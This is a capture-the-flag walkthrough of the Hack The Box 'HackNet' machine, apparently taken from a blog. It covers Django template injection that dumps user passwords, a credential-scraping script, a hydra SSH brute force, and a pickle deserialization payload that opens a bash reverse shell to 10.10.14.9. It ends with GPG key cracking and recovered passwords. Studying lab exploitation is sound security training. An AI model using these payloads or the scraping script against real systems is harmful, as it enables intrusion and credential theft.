---
title: HTB-HackNet
published: 2025-12-23
toc: true
draft: false
tags:
  - "Django"
  - "SSTI"
  - "gnupg"
---

```
Scope:
10.10.11.85
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -p- --min-rate=5000 -Pn -T5 -vvvv hacknet.htb

PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ8BFa2rPKTgVLDq1GN85n/cGWndJ63dTBCsAS6v3n8j85AwatuF1UE+C95eEdeMPbZ1t26HrjltEg2Dj+1A2DM=
|   256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFOSA3zBloIJP6JRvvREkPtPv013BYN+NNzn3kcJj0cH
80/tcp    open     http    syn-ack     nginx 1.22.1
|_http-title: HackNet - social network for hackers
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: B89198D9BEDA866B6ADC1D0CD9ECAEB6
|_http-server-header: nginx/1.22.1
```

## 80/TCP - HTTP

![](attachments/22cbdbcff95635ca79ea8785ddae1820.png)

I went ahead and registered a new account:

![](attachments/29be2cdbe8b6e0a4368aae015bf6d557.png)

![](attachments/abf8dc045e3f5238714ccb1450bb62cf.png)

I started looking around in the **Search** tab where I found that some users had private profiles:

![](attachments/8df38fa86bba5bbd93c3f306da7be526.png)

And some didn't:

![](attachments/b17f0380801559b36cc7f47f612803f0.png)

We can test out the *like* as well as the *comment* functionality:

![](attachments/ca8e2f230fa7881728ec2fae7dcb295a.png)

Apparently we need to add people first before we can comment:

![](attachments/c7879c1d0f2f2a4875531f8174622e10.png)

Inside *caido* I viewed the `/likes` route where I found that this showed all the profile pictures of the people that like the post:

![](attachments/b531fa18fcf390958bb2354cb9fdc99e.png)

I can also clearly see their username inside the *title* tag:

![](attachments/8f172f64dfbf6eaf9332a8819cdb9dfc.png)

### SSTI

:::note
Since the usernames are shown inside the title tag I can attempt **SSTI** by using the `{{ users }}` variable in order to dump all the usernames.
:::

Now I went ahead and tried testing out the following

![](attachments/e6649c7eccbda05b587f22cb1e5837d7.png)

![](attachments/4000cb794ff2c8409e455a36b661022a.png)

This time around the app dumped the complete `QuerySet` which appears to be all users who liked this post.

Moving on from here I would like to find out what the `SocialUser` object consists of. For this I'll use the following:

```jinja2
{{ users.values }}
```

![](attachments/403885a0f56ff8a8066747de2bca8922.png)

This time around it dumps the following variables:

![](attachments/28fbd0b1104c1c3dcf1baf4cfd0faa0d.png)

```
id
email
username
password
picture
about
contact_requests
unread_messages
is_public
is_hidden
two_fa
```

Having found this info we can start automating the next steps in order to quickly dump only the necessary information about all users.

```python
import re, html, requests

U = "http://hacknet.htb"
H = {
    "Cookie": "csrftoken=pWsK8Xea5pzMvqUDjABzeW1dhif4nS8R; sessionid=a70tgjtj5w59pwst7y1n7n2dz5ziqv7s", # Change these variables
    "User-Agent": "Mozilla/5.0"
}

out = set()

for i in range(1, 31):
    requests.get(f"{U}/like/{i}", headers=H)
    r = requests.get(f"{U}/likes/{i}", headers=H).text

    imgs = re.findall(r'title="([^"]+)"', r)
    if not imgs:
        continue

    q = html.unescape(imgs[-1])

    if "<QuerySet" not in q:
        requests.get(f"{U}/like/{i}", headers=H)
        r = requests.get(f"{U}/likes/{i}", headers=H).text
        imgs = re.findall(r'title="([^"]+)"', r)
        if not imgs:
            continue
        q = html.unescape(imgs[-1])

    for e, p in zip(
        re.findall(r"'email': '([^']*)'", q),
        re.findall(r"'password': '([^']*)'", q)
    ):
        out.add(f"{e.split('@')[0]}:{p}")

with open("creds.txt", "w") as f:
    for line in sorted(out):
        f.write(line + "\n")

print("\n===== * Found Users * =====\n")
print("\n".join(sorted(out)))
print("\n[+] Saved to creds.txt")
```

![](attachments/4a73f738e54b7cfa89861d958672f7fd.png)

## 22/TCP - SSH
### hydra

We can now attempt a brute force using the combination file that our script created:

```bash
hydra -C creds.txt ssh://hacknet.htb
```

![](attachments/2a15bbdae09e2a4632506e8e43b141b9.png)

# Foothold
## Shell as mikey

Using the correct credentials I logged in:

![](attachments/8f44fe44787dd5bbebdfc029c559293a.png)

### user.txt

It was here I could snatch the user flag right away:

![](attachments/c7ab7a73f10c23e3e789fa97b6b5ac13.png)

# Lateral Movement
## Django Cache Deserialization attack

Accordingly I went on to enumerate the system, where I started off with the web root:

![](attachments/944603b769b44fe9cb219b9d17dd64ea.png)

![](attachments/d38d319d32aa725d093599453cd00f34.png)

Inside the `views.py` file I found strong evidence that the target could be vulnerable to a **Django Cache Deserialization attack**.

![](attachments/91ccb1e9d6f6e54b73d9c6cddbaabf18.png)

I then found out that the `django_cache` directory is owned by *sandy*.

![](attachments/ecaf9a159c7b5de094e3fb026883cda6.png)

I can write the following poc in order to get myself a reverse shell as *sandy*:

```python
import pickle
import base64

# Exploit object
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, (f'bash -c "bash -i >& /dev/tcp/10.10.14.9/443 0>&1"',),)

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload)
```

![](attachments/d5348f076cf1e7f85daf2a59f97158da.png)

After heading over to `/explore` a new set of django cache files are created:

![](attachments/840ce51fe41c0b6ecc2e744653201959.png)

![](attachments/14286f290de8b26bc92bd825adada6b3.png)

Since I can't simply overwrite the files I'll have to get creative:

![](attachments/bfbd77ca3f43f01e55d8499b980b82a7.png)

Using the following regex however we can overwrite the files and make them executable:

```bash
for i in $(ls); do rm -f $i; echo 'gASVTAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDFiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzIDA+JjEilIWUUpQu' | base64 -d > $i; chmod +x $i; done
```

![](attachments/a920df3707c0deadd438f8a7c071cd6b.png)

## Shell as sandy

Now when we refresh the web page again the exploit fires and we get a reverse shell:

![](attachments/47d4d21c692e0a9b07b6af353e703d46.png)

I headed over to the home directory and started enumerating

![](attachments/3968de9df973f338c80aad609ee2ea52.png)

Inside the `.gnupg` directory some private keys were found:

![](attachments/dc696adea30b553d89e9d9201d03afd4.png)

# Privilege Escalation
## gnupg keys

We can easily decrypt it as follows:

```bash
cp -r .gnupg/ /tmp/gnupg
chmod -R 700 /tmp/gnupg/
gpg --homedir /tmp/gnupg/ --list-secret-keys
```

![](attachments/0da8d9663d1915bf853edd8307f994c1.png)

I will then download over the `armored_key.asc` key to decrypt it using `john`.

![](attachments/db53f41a6a94c038ef371ca4792ff514.png)

![](attachments/b121e81a4c6dc0aea98016bf8ec1e543.png)

We get an instant result:

![](attachments/24aea149a0082fdf1c23210e021e1f1b.png)

```
sweetheart
```

Next up I will use the following:

```bash
gpg --import armored_key.asc
gpg --output backup02.sql --decrypt /var/www/HackNet/backups/backup02.sql.gpg 
```

![](attachments/37851975cf61d39c5868d99fcd7f2fed.png)

![](attachments/0750f879f57ecff6a2a8a02f5f851bc6.png)

![](attachments/74f28d3c95d223ea553df5827fc3e371.png)

Now we can view the contents of the file.

![](attachments/f06beae95687bf4705f60bb2d7424f8c.png)

While scrolling through the backup we find an interesting find:

![](attachments/1a1eda242779f76095bae2c097efaf2a.png)

```
h4ck3rs4re3veRywh3re99
```

## Logging in as root

![](attachments/a5d513d8786b80bdfdaf59b7f2e2a59b.png)

### root.txt

![](attachments/65051e7408a736ceb6e7482f89e38477.png)

![](attachments/7058ae7cdecd77061f3510f3ce71675d.png)

---